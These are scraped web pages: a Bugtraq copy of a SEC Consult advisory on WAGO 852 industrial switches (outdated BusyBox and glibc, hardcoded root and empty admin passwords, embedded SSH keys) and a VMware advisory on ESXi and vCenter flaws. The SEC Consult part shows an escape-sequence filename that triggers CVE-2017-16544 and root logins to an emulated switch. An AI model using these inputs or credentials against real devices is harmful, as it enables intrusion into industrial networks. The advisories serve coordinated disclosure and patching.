* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from seclists.org_c14c9179_20250125_072700.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Thu, 13 Jun 2019 08:01:54 +0200

---

```
SEC Consult Vulnerability Lab Security Advisory < 20190612-0 >
=======================================================================
              title: Multiple vulnerabilities
            product: WAGO 852 Industrial Managed Switch Series
 vulnerable version: 852-303: <v1.2.2.S0
                     852-1305: <v1.1.6.S0
                     852-1505: <v1.1.5.S0
      fixed version: 852-303: v1.2.2.S0
                     852-1305: v1.1.6.S0
                     852-1505: v1.1.5.S0
         CVE number: CVE-2019-12550, CVE-2019-12549
             impact: high
           homepage: <https://www.wago.com>
              found: 2019-03-08
                 by: T. Weber (Office Vienna)
                     IoT Inspector
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"New ideas are the driving force behind our success WAGO is a family-owned
company headquartered in Minden, Germany. Independently operating for three
generations, WAGO is the global leader of spring pressure electrical
interconnect and automation solutions. For more than 60 years, WAGO has
developed and produced innovative products for packaging, transportation,
process, industrial and building automation markets amongst others. Aside from
its innovations in spring pressure connection technology, WAGO has introduced
numerous innovations that have revolutionized industry. Further ground-breaking
inventions include: the WAGO-I/O-SYSTEM®, TOPJOB S® and WALL-NUTS®."

Source: <http://www.wago.us/wago/>

Business recommendation:
------------------------
SEC Consult recommends to immediately apply the available patches
from the vendor. A thorough security review should be performed by
security professionals to identify further potential security issues.

Vulnerability overview/description:
-----------------------------------
The industrial managed switch series 852 from WAGO is affected by multiple
vulnerabilities such as old software components embedded in the firmware.
Furthermore, hardcoded password hashes and credentials were also found by doing
an automated scan with IoT Inspector. Two vulnerabilities (CVE-2017-16544 and
CVE-2015-0235) were verified by emulating the device with the MEDUSA scaleable
firmware runtime. The validity of the password hashes and the embedded keys were
also verified by emulating the device.

1) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.12.0 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.8 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-0235, "GHOST") was verified by
using the MEDUSA scaleable firmware runtime.

3) Hardcoded Credentials (CVE-2019-12550)
The device contains hardcoded users and passwords which can be used to login
via SSH and Telnet.

4) Embedded Private Keys (CVE-2019-12549)
The device contains hardcoded private keys for the SSH daemon. The fingerprint
of the SSH host key from the corresponding SSH daemon matches to the embedded
private key.

Proof of concept:
-----------------
1) Known BusyBox Vulnerabilities
BusyBox version 1.12.0 contains multiple CVEs like:
CVE-2013-1813, CVE-2016-2148, CVE-2016-6301, CVE-2011-2716, CVE-2011-5325,
CVE-2015-9261, CVE-2016-2147 and more.

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device. A file with the name "\ectest\n\e]55;test.txt\a" was created
to trigger the vulnerability.

-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.8 contains multiple CVEs like:
CVE-2010-0296, CVE-2010-3856, CVE-2012-4412, CVE-2014-4043, CVE-2014-9402,
CVE-2014-9761, CVE-2014-9984, CVE-2015-1472 and more.

The gethostbyname buffer overflow vulnerability (GHOST) was checked with the help
of the exploit code from <https://seclists.org/oss-sec/2015/q1/274>. It was compiled
and executed on the emulated device to test the system.

3) Hardcoded Credentials (CVE-2019-12550)
The following credentials were found in the 'passwd' file of the firmware:
<Password Hash>                                 <Plaintext>         <User>
<removed>                                       <removed>            root
No password is set for the account              [EMPTY PASSWORD]     admin

By using these credentials, it's possible to connect via Telnet and SSH on the
emulated device. Example for Telnet:
-------------------------------------------------------------------------------
[root@localhost ~]# telnet 192.168.0.133
Trying 192.168.0.133...
Connected to 192.168.0.133.
Escape character is '^]'.

L2SWITCH login: root
Password:
~ #
-------------------------------------------------------------------------------
Example for SSH:
-------------------------------------------------------------------------------
[root@localhost ~]# ssh 192.168.0.133
root@192.168.0.133's password:
~ #
-------------------------------------------------------------------------------

4) Embedded Private Keys (CVE-2019-12549)
The following host key fingerprint is shown by accessing the SSH daemon on
the emulated device:

[root@localhost ~]# ssh 192.168.0.133
The authenticity of host '192.168.0.133 (192.168.0.133)' can't be established.
RSA key fingerprint is SHA256:X5Vr0/x0/j62N/aqZmHz96ojwl8x/I8mfzuT8o6uZso.
RSA key fingerprint is MD5:2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2.

This matches the embedded private key (which has been removed from this advisory):
SSH Fingerprint: 2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2

Vulnerable / tested versions:
-----------------------------
According to the vendor, the following versions are affected:
* 852-303: <v1.2.2.S0
* 852-1305: <v1.1.6.S0
* 852-1505: <v1.1.5.S0

Vendor contact timeline:
------------------------
2019-03-12: Contacting VDE CERT through info () cert vde com, received confirmation
2019-03-26: Asking for a status update, VDE CERT is still waiting for details
2019-03-28: VDE CERT requests information from WAGO again
2019-04-09: Asking for a status update
2019-04-11: VDE CERT: patched firmware release planned for end of May, requested
            postponement of advisory release
2019-04-16: VDE CERT: update regarding affected firmware versions
2019-04-24: Confirming advisory release for beginning of June
2019-05-20: Asking for a status update
2019-05-22: VDE CERT: no news from WAGO yet, 5th June release date
2019-05-29: Asking for a status update
2019-05-29: VDE CERT: detailed answer from WAGO, patches will be published
            on 7th June, SEC Consult proposes new advisory release date for
            12th June
2019-06-07: VDE CERT provides security advisory information from WAGO;
            WAGO releases security patches
2019-06-12: Coordinated release of security advisory

Solution:
---------
The vendor provides patches to their customers at their download page. The
following versions fix the issues:
* 852-303: v1.2.2.S0
* 852-1305: v1.1.6.S0
* 852-1505: v1.1.5.S0

According to the vendor, busybox and glibc have been updated and the embedded
private keys are being newly generated upon first boot and after a factory reset.
The root login via Telnet and SSH has been disabled and the admin account is
documented and can be changed by the customer.

Workaround:
-----------
Restrict network access to the device & SSH server.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2019

```

**Attachment:
[smime.p7s](att-14/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

---

[![Previous](/images/left-icon-16x16.png)](13)
[By Date](date.html#14)
[![Next](/images/right-icon-16x16.png)](15)

[![Previous](/images/left-icon-16x16.png)](13)
[By Thread](index.html#14)
[![Next](/images/right-icon-16x16.png)](15)

### Current thread:

* **SEC Consult SA-20190612-0 :: Multiple vulnerabilities in WAGO 852 Industrial Managed Switch Series** *SEC Consult Vulnerability Lab (Jun 13)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.vmware.com_975330d3_20250125_072657.html ===


Menu

* [Products](https://www.broadcom.com/products/)
* [Solutions](https://www.broadcom.com/solutions)
* [Support and Services](https://www.broadcom.com/support)
* [Company](https://www.broadcom.com/company/about-us/)
* [How To Buy](https://www.broadcom.com/how-to-buy/#sales)

* Log in

  [Log In](/c/portal/login)
  [Register](https://profile.broadcom.com/web/registration)

[Register](https://profile.broadcom.com/web/registration)
[Login](/c/portal/login)

VMSA-2019-0013:VMware ESXi and vCenter Server updates address command injection and information disclosure vulnerabilities.

Product/Component

VMware

0 more products

List of Products

1 Products

* VMware

Notification Id

23558

Last Updated

14 September 2019

Initial Publication Date

14 September 2019

Status

CLOSED

Severity

HIGH

CVSS Base Score

4.2-7.7

WorkAround

Affected CVE

CVE-2017-16544,CVE-2019-5531,CVE-2019-5532,CVE-2019-5534

## VMware Security Advisories

| Advisory ID | VMSA-2019-0013.1 |
| --- | --- |
| Advisory Severity | Important |
| CVSSv3 Range | 4.2-7.7 |
| Synopsis | VMware ESXi and vCenter Server updates address command injection and information disclosure vulnerabilities. (CVE-2017-16544, CVE-2019-5531, CVE-2019-5532, CVE-2019-5534) |
| Issue Date | 2019-09-16 |
| Updated On | 2019-09-19 |
| CVE(s) | CVE-2017-16544, CVE-2019-5531, CVE-2019-5532, CVE-2019-5534 |

#####

##### 1. Impacted Products

* VMware vSphere ESXi (ESXi)
* VMware vCenter Server (vCenter)

#####

##### 2. Introduction

###### ESXi and vCenter updates address multiple vulnerabilities.

* CVE-2017-16544: VMware ESXi command injection vulnerability
* CVE-2019-5531: ESXi Host Client, vCenter vSphere Client and vCenter vSphere Web Client information disclosure vulnerability
* CVE-2019-5532: VMware vCenter Server information disclosure vulnerability
* CVE-2019-5534:  VMware vCenter Server Information disclosure vulnerability in vAppConfig properties

######

##### 3a. VMware ESXi 'busybox' command injection vulnerability- CVE-2017-16544

**Description:**

ESXi contains a command injection vulnerability due to the use of vulnerable version of busybox that does not sanitize filenames which may result into executing any escape sequence in the shell. VMware has evaluated the severity of this issue to be in the [Moderate severity range](https://www.vmware.com/support/policies/security_response.html) with a maximum CVSSv3 base score of [6.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H).

**Known Attack Vectors:**

An attacker may exploit this issue by tricking an ESXi Admin into executing shell commands by providing a malicious file.

**Resolution:**

To remediate CVE-2017-16544 update/upgrade to the versions listed in the 'Fixed Version' column of the 'Resolution Matrix' found below.

**Workarounds:**

None.

**Additional Documentations:**

None.

**Acknowledgements:**

VMware would like to thank Zhouyuan Yang of Fortinet's FortiGuard Labs for notifying about this issue to us.

**Response Matrix:**

| Product | Version | Running On | CVE Identifier | CVSSV3 | Severity | Fixed Version | Workarounds | Additional Documents |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| ESXi | 6.7 | Any | CVE-2017-16544 | [6.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H) | Moderate | ESXi670-201904101-SG | None | None |
| ESXi | 6.5 | Any | CVE-2017-16544 | [6.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H) | Moderate | ESXi650-201907101-SG | None | None |
| ESXi | 6.0 | Any | CVE-2017-16544 | [6.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H) | Moderate | ESXi600-201909101-SG | None | None |

##### 3b. ESXi Host Client, vCenter vSphere Client and vCenter vSphere Web Client information disclosure vulnerability- CVE-2019-5531

**Description:**

An information disclosure vulnerability in clients arising from insufficient session expiration. VMware has evaluated the severity of this issue to be in the [Moderate severity range](https://www.vmware.com/support/policies/security_response.html) with a maximum CVSSv3 base score of [4.2](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N).

This issue affects:

* ESXi VMware Host Client (6.7, 6.5, 6.0).
* vCenter Server vSphere Client (HTML5) (6.7, 6.5).
* vCenter Server vSphere Web Client (FLEX/Flash) (6.7, 6.5, 6.0).

**Known Attack Vectors:**

An attacker with physical access or an ability to mimic a websocket connection to a user’s browser may be able to obtain control of a VM Console after the user has logged out or their session has timed out.

**Resolution:**

To remediate CVE-2019-5531 update/upgrade to the versions listed in the 'Fixed Version' column of the 'Resolution Matrix' found below.

**Workarounds:**

None.

**Additional Documentations:**

None.

**Acknowledgements:**

VMware would like to thank Dejan Zelic for reporting this issue to us.

**Response Matrix:**

| Product | Version | Running On | CVE Identifier | CVSSV3 | Severity | Fixed Version | Workarounds | Additional Documents |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| ESXi | 6.7 | Any | CVE-2019-5531 | [4.2](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) | Moderate | ESXi670-201810101-SG | None | None |
| ESXi | 6.5 | Any | CVE-2019-5531 | [4.2](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) | Moderate | ESXi650-201811102-SG | None | None |
| ESXi | 6.0 | Any | CVE-2019-5531 | [4.2](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) | Moderate | ESXi600-201807103-SG | None | None |
| vCenter | 6.7 | Any | CVE-2019-5531 | [4.2](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) | Moderate | 6.7 U1b | None | None |
| vCenter | 6.5 | Any | CVE-2019-5531 | [4.2](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) | Moderate | 6.5 U2b | None | None |
| vCenter | 6.0 | Any | CVE-2019-5531 | [4.2](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N) | Moderate | 6.0 U3j | None | None |

##### 3c. VMware vCenter Server information disclosure vulnerability- CVE-2019-5532

**Description:**

VMware vCenter Server contains an information disclosure vulnerability due to the logging of credentials in plain-text for virtual machines deployed through OVF. VMware has evaluated the severity of this issue to be in the [Important severity range](https://www.vmware.com/support/policies/security_response.html) with a maximum CVSSv3 base score of [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N).

**Known Attack Vectors:**

A malicious user with access to the log files containing vCenter OVF-properties of a virtual machine deployed from an OVF may be able to view the credentials used to deploy the OVF (typically the root account of the virtual machine).

**Resolution:**

To remediate CVE-2019-5532, update/upgrade to the versions listed in the 'Fixed Version' column of the 'Resolution Matrix' found below.

**Workarounds:**

If the password of the deployment account (typically root) is changed on the virtual machine after deployment of the OVF then the credentials stored in the vCenter OVF-properties will no longer be valid and cannot be used to access the virtual machine.

**Additional Documentations:**

None.

**Acknowledgements:**

VMware would like to thank Ola Beyioku for reporting this issue to us.

**Response Matrix:**

| Product | Version | Running On | CVE Identifier | CVSSV3 | Severity | Fixed Version | Workarounds | Additional Documents |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| vCenter | 6.7 | Any | CVE-2019-5532 | [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Important | 6.7 U3 | See above | None |
| vCenter | 6.5 | Any | CVE-2019-5532 | [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Important | 6.5 U3 | See above | None |
| vCenter | 6.0 | Any | CVE-2019-5532 | [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Important | 6.0 U3j | See above | None |

##### 3d. Information disclosure vulnerability in vAppConfig properties - CVE-2019-5534

**Description:**

Virtual Machines deployed from an OVF could expose login information via the virtual machine's vAppConfig properties. VMware has evaluated the severity of this issue to be in the [Important severity range](https://www.vmware.com/support/policies/security_response.html) with a maximum CVSSv3 base score of [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N).

**Known Attack Vectors:**

A malicious actor with access to query the vAppConfig properties of a virtual machine deployed from an OVF may be able to view the credentials used to deploy the OVF (typically the root account of the virtual machine).

**Resolution:**

To mitigate CVE-2019-5534 upgrade to the versions listed in the 'Fixed Version' column of the 'Resolution Matrix' found below.

**Workarounds:**

The information stored in vAppConfig properties is captured at the time of deployment. If the password of the deployment account (typically root) is changed on the virtual machine after deployment of the OVF then the credentials stored in the vAppConfig properties will no longer be valid and cannot be used to access the virtual machine.

**Additional Documentations:**

None.

**Acknowledgements:**

VMware would like to thank Rich Browne of F5 Networks for reporting this issue to us.

**Response Matrix:**

| Product | Version | Running On | CVE Identifier | CVSSV3 | Severity | Fixed Version | Workarounds | Additional Documents |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| vCenter | 6.7 | Any | CVE-2019-5534 | [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Important | 6.7 U3 | See above | None |
| vCenter | 6.5 | Any | CVE-2019-5534 | [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Important | 6.5 U3 | See above | None |
| vCenter | 6.0 | Any | CVE-2019-5534 | [7.7](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) | Important | 6.0 U3j | See above | None |

**4. References**
**Mitre CVE Dictionary Links:**

<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16544>
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5531>
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5532>
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5534>

**Fixed Version(s) and Release Notes:**

**ESXi 6.7 U3**
Downloads and Documentation:

<https://my.vmware.com/web/vmware/details?productId=742&downloadGroup=ESXI67U3>
<https://docs.vmware.com/en/VMware-vSphere/6.7/rn/vsphere-esxi-67u3-release-notes.html>

**ESXi 6.7 U2**
Downloads and Documentation:

<https://my.vmware.com/group/vmware/details?productId=742&downloadGroup=ESXI67U2>
<https://docs.vmware.com/en/VMware-vSphere/6.7/rn/vsphere-esxi-67u2-release-notes.html>

**ESXi 6.7 U1**

Downloads and Documentation:

<https://my.vmware.com/web/vmware/details?downloadGroup=ESXI67U1&productId=742>
<https://docs.vmware.com/en/VMware-vSphere/6.7/rn/vsphere-esxi-671-release-notes.html>

**ESXi 6.5 U3**
Downloads and Documentation:

<https://my.vmware.com/web/vmware/details?downloadGroup=ESXI65U3&productId=614>
<https://docs.vmware.com/en/VMware-vSphere/6.5/rn/vsphere-esxi-65u3-release-notes.html>

**ESXi 6.5, Patch Release ESXi650-201806001**
Downloads and Documentation:

<https://my.vmware.com/group/vmware/patch>
<https://kb.vmware.com/s/article/55912>

**ESXi 6.0, Patch Release ESXi600-201807001**
Downloads and Documentation:

<https://my.vmware.com/group/vmware/patch>
<https://kb.vmware.com/s/article/53627>

**ESXi 6.0, Patch Release ESXi600-201909001**
Downloads and Documentation:

<https://my.vmware.com/group/vmware/patch>
<https://docs.vmware.com/en/VMware-vSphere/6.0/rn/esxi600-201909001.html>

**vCenter 6.7 U1b**
Downloads and Documentation:

<https://my.vmware.com/group/vmware/details?downloadGroup=VC67U1B&productId=742>
<https://docs.vmware.com/en/VMware-vSphere/6.7/rn/vsphere-vcenter-server-67u1b-release-notes.html>

**vCenter 6.5 U2b**

Downloads and Documentation:

<https://my.vmware.com/group/vmware/details?downloadGroup=VC65U2B&productId=614&rPId=24466>
<https://docs.vmware.com/en/VMware-vSphere/6.5/rn/vsphere-vcenter-server-65u2b-release-notes.html>

**vCenter 6.5 U3**
Downloads and Documentation:

<https://my.vmware.com/web/vmware/details?productId=614&downloadGroup=VC65U3>
<https://docs.vmware.com/en/VMware-vSphere/6.5/rn/vsphere-vcenter-server-65u3-release-notes.html>

**vCenter 6.0 U3j**
Downloads and Documentation:

<https://my.vmware.com/web/vmware/details?downloadGroup=VC60U3J&productId=491>
<https://docs.vmware.com/en/VMware-vSphere/6.0/rn/vsphere-vcenter-server-60u3j-release-notes.html>

**5. Change log**

**2019-09-16:** **VMSA-2019-0013** Initial security advisory detailing remediation information for the VMware vSphere ESXi and VMware vCenter Server 6.7, 6.5 and 6.0 release lines.

**2019-09-19: VMSA-2019-0013.1** Updated security advisory to reflect the correct ESXi patches for issue **3(b)**.

**6. Contact**

E-mail list for product security notifications and announcements:

<https://lists.vmware.com/cgi-bin/mailman/listinfo/security-announce>

This Security Advisory is posted to the following lists:

[[email protected]](/cdn-cgi/l/email-protection#d5a6b0b6a0a7bca1acf8b4bbbbbaa0bbb6b095b9bca6a1a6fba3b8a2b4a7b0fbb6bab8)

[[email protected]](/cdn-cgi/l/email-protection#83e1f6e4f7f1e2f2c3f0e6e0f6f1eaf7fae5ece0f6f0ade0ecee)

[[email protected]](/cdn-cgi/l/email-protection#5731223b3b333e24343b3824222532172432343b3e24232479382530)

E-mail: [[email protected]](/cdn-cgi/l/email-protection)

PGP key at:

<https://kb.vmware.com/kb/1055>

VMware Security Advisories

<https://www.vmware.com/security/advisories>

VMware Security Response Policy

<https://www.vmware.com/support/policies/security_response.html>

VMware Lifecycle Support Phases

<https://www.vmware.com/support/policies/lifecycle.html>

VMware Security & Compliance Blog

<https://blogs.vmware.com/security>

Twitter

<https://twitter.com/VMwareSRC>

Copyright 2019 VMware Inc. All rights reserved.

Hidden

#####

×

It appears your Broadcom Products and Services are

supported by one of our certified Support partners

Click below to be redirected to the appropriate Support

Partner Portal to request support

For non-product related issues (Support Portal / Licensing) Click HERE

Continue

#####

×

For **Technical Support** (issues with products or services)

1. Select **Technical** to be redirected to the My Entitlements page
2. Expand the product you require support on
3. Select the case icon from the case column
4. You will be redirected to the appropriate vendor portal where you can raise your technical request

For **Non-Technical Support** (issues with portal access, license keys, software downloads)

1. Select **Non-Technical** to be redirected to Broadcom's case management portal

Technical
Non-Technical

#####

×

# Access Denied

This feature has been disabled by your administrator.

#####

×

To prevent this message from showing again, please enable pop-up blockers for [support.broadcom.com](https://support.broadcom.com/)
or click Continue to proceed.

Continue

Top

* [Products](https://www.broadcom.com/products)
* [Solutions](https://www.broadcom.com/solutions)
* [Support and Services](https://www.broadcom.com/support)
* [Company](https://www.broadcom.com/)
* [How to Buy](https://www.broadcom.com/how-to-buy)

 Copyright © 2005-2024 Broadcom. All Rights Reserved. The term “Broadcom” refers to Broadcom Inc. and/or its subsidiaries.

* [Accessibility](https://www.broadcom.com/company/legal/accessibility)
* [Privacy](https://www.broadcom.com/company/legal/privacy)
